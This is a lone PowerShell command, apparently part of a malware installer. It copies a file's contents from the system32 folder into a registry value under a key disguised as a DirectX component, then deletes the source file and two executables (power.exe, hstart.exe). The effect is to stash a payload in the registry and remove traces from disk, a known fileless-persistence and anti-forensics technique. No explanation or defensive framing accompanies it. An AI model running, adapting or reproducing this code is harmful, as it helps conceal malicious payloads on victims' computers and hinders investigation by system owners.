
$b=Get-Content $env:windir\system32\1.txt;Set-ItemProperty -Path "HKLM:\SOFTWARE\Classes\DIRECT.DirectX5.0\scripts" -Name "1" -Value $b;Remove-Item $env:windir\system32\1.txt;Remove-Item $env:windir\system32\power.exe;Remove-Item $env:windir\system32\hstart.exe

